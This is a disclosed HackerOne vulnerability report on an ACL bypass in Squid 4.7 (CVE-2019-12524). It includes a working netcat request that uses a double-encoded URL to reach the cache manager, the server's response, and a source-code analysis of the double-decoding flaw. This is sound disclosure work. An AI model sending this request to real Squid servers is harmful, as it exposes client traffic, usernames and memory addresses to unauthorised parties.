# Cache Manager ACL Bypass

## Report Details
- **Report ID**: 824203
- **URL**: https://hackerone.com/reports/824203
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-03-18T23:53:54.106Z
- **Disclosed**: 2021-08-26T23:28:49.164Z

## Reporter
- **Username**: jeriko_one
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
## Summary:
ACL Manager can be bypassed giving non authorized users to squid-internal-mgr.
Possible to bypass other url_regex, but only focused on manager. 

<= Squid-4.7 vulnerable
Silently Fixed in Squid-4.8 
Announce page was allocated, but never made http://www.squid-cache.org/Advisories/SQUID-2019_4.txt As another issue similar to this wasn't fixed 

Patch: http://www.squid-cache.org/Versions/v4/changesets/squid-4-e1e861eb9a04137fe81decd1c9370b13c6f18a18.patch

Assigned: CVE-2019-12524
## Steps To Reproduce:

1) Start squid-4.7
```
./sbin/squid
```

2) Issue the following request replacing <hostname> with the hostname of the server running squid
```
echo -e "GET https://jeriko.one%252f@<hostname>:3128/squid-internal-mgr/active_requests HTTP/1.1\r\n\r\n" |nc <hostname> 3128
```

```
HTTP/1.1 200 OK
Server: squid/4.7
Mime-Version: 1.0
Date: Wed, 18 Mar 2020 23:41:31 GMT
Content-Type: text/plain;charset=utf-8
Expires: Wed, 18 Mar 2020 23:41:31 GMT
Last-Modified: Wed, 18 Mar 2020 23:41:31 GMT
X-Cache: MISS from g64
Transfer-Encoding: chunked
Via: 1.1 g64 (squid/4.7)
Connection: keep-alive

1AF
Connection: 0x5594f78d95f8
	FD 10, read 85, wrote 0
	FD desc: Reading next request
	in: buf 0x5594f7d2e1a4, used 1, free 4011
	remote: 192.168.4.144:38376
	local: 192.168.4.144:3128
	nrequests: 1
uri https://jeriko.one%2f@g64:3128/squid-internal-mgr/active_requests
logType TCP_MISS
out.offset 0, out.size 0
req_sz 84
entry 0x5594f7d2b720/0300000000000000291F000001000000
start 1584574891.149644 (0.000000 seconds ago)
username -


0
```
You should have accessed the active_requests page in the squid-internal-mgr 

## Analysis

When Squid is checking ACLs and it wants to check if a URL is a cache manager
URL it checks the following rule

```
 default_line("acl manager url_regex -i ^cache_object:// +i ^https?://[^/]+/squid-internal-mgr/");
```
When checking if the URL matches the regex the function
ACLUrlStrategy::match will be called. This will get the effectiveRequestUri,
decode it and then try to match it against the regex

```
ACLUrlStrategy::match (ACLData<char const *> * &data, ACLFilledChecklist *checklist)
{
    char *esc_buf = SBufToCstring(checklist->request->effectiveRequestUri());
    rfc1738_unescape(esc_buf);
    int result = data->match(esc_buf);
    xfree(esc_buf);
    return result;
}
```
effectiveRequestUri() will return url.absolute() for methods that aren't
CONNECT and schemes that aren't PROTO_AUTHORITY_FORM

 Looking at Uri::absolute we see that the userInfo is included into the
 absolute uri representation if the protocol is HTTPS

```
             const bool omitUserInfo = getScheme() == AnyP::PROTO_HTTP ||
                                      getScheme() != AnyP::PROTO_HTTPS ||
                                      userInfo().isEmpty();
            if (!omitUserInfo) {
                absolute_.append(userInfo());
                absolute_.append("@", 1);
            }
```
userInfo is set in Uri::parse if the foundHost contains a @ that
the userinfo is extracted and then decoded.
```
        t = strrchr(foundHost, '@');
        if (t != NULL) {
            strncpy((char *) login, (char *) foundHost, sizeof(login)-1);
            login[sizeof(login)-1] = '\0';
            t = strrchr(login, '@');
            *t = 0;
            strncpy((char *) foundHost, t + 1, sizeof(foundHost)-1);
            foundHost[sizeof(foundHost)-1] = '\0';
            // Bug 4498: URL-unescape the login info after extraction
            rfc1738_unescape(login);
        }
```
This is eventually stored in userInfo when calling parseFinish
 parseFinish(protocol, proto, urlpath, foundHost, SBuf(login), foundPort);

This userInfo is the decoded version, therefore special tokens such as ? # /
are possible entries in the userInfo. 

We see now that the URL is decoded twice when checking RegexURL acls.

Let's consider the following example URL to show how we can access
CacheManager due to this double decode flaw.

g64 is the name of my Squid server

https://jeriko.one%252f@g64:3128/squid-internal-mgr/active_requests

First in clientProcessRequest my request will be marked as internal as the
path is /squid-internal-mgr/active_requests, and the url.host and url.port
match the Squid server hostname and port number
```
    if (internalCheck(request->url.path())) {
        if (internalHostnameIs(request->url.host()) && request->url.port() == getMyPort()) {
            debugs(33, 2, "internal URL found: " << request->url.getScheme() << "://" << request->url.authority(true));
            http->flags.internal = true;
```
As it makes it way through ACL checks it'll come against the Manager regex acl

After the call rfc1738_unescape is made my URL is now
"https://jeriko.one/@g64:3128/squid-internal-mgr/active_requests"

Which fails against the Manager regex check

As this decoding didn't change the original URL, when I reach internalStart my
path will match against mgrPfx, giving me access to the cache manager.

The Cache manager has a lot of useful information for anyone who is curious on
what type of traffic is going through a Squid server. It also provides useful
information for someone trying to gain remote code execution over the server
as the cmd active_requests holds a number of in use addresses

## Impact

Bypasses restrictions on squid-internal-mgr. This allows an attacker to gain information on Squid clients, request being made, usernames, peer servers, servers being reversed proxied,  in memory objects, addresses of objects which can be used to break ASLR. 

A list can be found in stat.cc where functions are registered to the Manager.

## Attachments
No attachments
